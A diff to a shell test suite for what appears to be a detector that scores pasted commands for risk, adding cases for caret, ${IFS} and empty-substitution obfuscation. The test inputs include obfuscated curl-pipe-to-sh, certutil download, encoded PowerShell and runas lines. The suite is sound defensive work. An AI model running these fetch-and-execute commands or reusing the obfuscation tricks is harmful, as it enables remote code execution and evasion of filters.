@@ -853,7 +853,22 @@ jcheck "obf: quoted word benign" 'd["score"] == 0' paste "a \"quoted\" word"
 jcheck "unc: bare xcopy benign" 'd["score"] == 0' paste "xcopy a b && dir"
 jcheck "obf: curl.exe pipe == 40" 'd["score"] == 40' paste "curl.exe http://e | sh"
 jcheck "unc: xcopy share + start exec == 45" 'd["score"] == 45' paste "xcopy \\\\e\\s\\x.exe %TEMP%\\ && start x"
-jcheck "ps: -ec flag == 65" 'd["score"] == 65' paste "powershell -ec SGVsbG8="
+
+# shell-escape obfuscation normalization (cycle 497): ^x->x, ${IFS}->space,
+# empty $(:) substitutions, runas priv-esc
+jcheck "obf: caret curl pipe == 40" 'd["score"] == 40' paste "cu^rl http://e | sh"
+jcheck "obf: caret everywhere powershell == 65" 'd["score"] == 65' paste "p^o^w^e^r^s^h^e^l^l -enc x"
+jcheck "obf: caret certutil == 65" 'd["score"] == 65' paste "cert^util -urlcache -f http://e/x x"
+jcheck "obf: cu^^rl benign (decodes to cu^rl)" 'd["score"] == 0' paste "cu^^rl http://e | sh"
+jcheck "obf: dollar-IFS curl == 40" 'd["score"] == 40' paste 'curl$IFS http://e | sh'
+jcheck "obf: brace-IFS curl == 40" 'd["score"] == 40' paste 'curl${IFS}http://e | sh'
+jcheck "obf: empty-subst curl == 40" 'd["score"] == 40' paste 'cu$(:)rl http://e | sh'
+jcheck "obf: true-subst curl == 40" 'd["score"] == 40' paste 'c$(true)url http://e | sh'
+jcheck "priv: runas user == 15" 'd["score"] == 15' paste "runas /user:admin cmd"
+jcheck "priv: runas profile benign" 'd["score"] == 0' paste "runas /profile cmd"
+jcheck "obf: escaped pipe benign" 'd["score"] == 0' paste "echo a ^| clip"
+jcheck "obf: escaped amp benign" 'd["score"] == 0' paste "echo x ^& y"
+jcheck "obf: caret word benign" 'd["score"] == 0' paste "a^b file"
 
 # secret findings[] carry a 1-based line number (SIEM/remediation locus)
 printf 'l1\nl2\nl3\nAuthorization: Bearer abcdef1234567890abcdefghij\n' | jcheck "secret finding reports correct line number" "'\"line\":4' in s" secret --stdin
